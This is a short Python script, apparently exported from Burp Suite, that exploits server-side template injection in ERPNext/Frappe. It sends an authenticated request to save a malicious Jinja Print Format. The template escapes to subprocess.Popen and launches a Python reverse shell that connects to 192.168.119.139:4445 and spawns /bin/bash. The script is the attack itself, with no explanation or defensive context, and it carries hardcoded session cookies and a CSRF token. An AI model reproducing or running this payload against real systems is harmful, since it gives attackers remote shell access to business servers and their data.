import requests

session = requests.session()

burp0_url = "http://erpnext:8000/api/method/frappe.desk.form.save.savedocs"
burp0_cookies = {"user_image": "", "sid": "d1c39469597cc7ce2a2eaac5f69a88cbec98136c6eb6ed5a4c6bfc02", "system_user": "yes", "full_name": "Zeljka%20Kola%C5%A1inac", "user_id": "zeljka.k%40randomdomain.com"}
burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0", "Accept": "application/json", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Frappe-CSRF-Token": "ff3131d9edcec1838c3c0445d934a98d6201e5e9dbba021360aed4e4", "X-Frappe-CMD": "", "X-Requested-With": "XMLHttpRequest", "Origin": "http://erpnext:8000", "Connection": "close", "Referer": "http://erpnext:8000/desk"}
burp0_data = {"doc": "{\"docstatus\":0,\"doctype\":\"Print Format\",\"name\":\"New Print Format 1\",\"__islocal\":1,\"__unsaved\":1,\"owner\":\"zeljka.k@randomdomain.com\",\"standard\":\"No\",\"print_format_type\":\"Jinja\",\"align_labels_right\":0,\"show_section_headings\":0,\"line_breaks\":0,\"default_print_language\":\"en\",\"font\":\"Default\",\"custom_format\":1,\"__newname\":\"Donkey\",\"module\":\"Setup\",\"doc_type\":\"Company\",\"html\":\"{% set string = \\\"ssti\\\" %}\\n{% set class = \\\"__class__\\\" %}\\n{% set mro = \\\"__mro__\\\" %}\\n{% set subclasses = \\\"__subclasses__\\\" %}\\n{% set mro_r = string|attr(class)|attr(mro) %}\\n{% set subclasses_r = mro_r[1]|attr(subclasses)() %}\\n{% for x in subclasses_r %}\\n{% if 'Popen' in x|attr('__qualname__')%}\\n{{ x([\\\"/usr/bin/python3\\\",\\\"-c\\\",\\\"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('192.168.119.139',4445));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn('/bin/bash')\\\"]) }}\\n{% endif %}\\n{% endfor %}\"}", "action": "Save"}
session.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)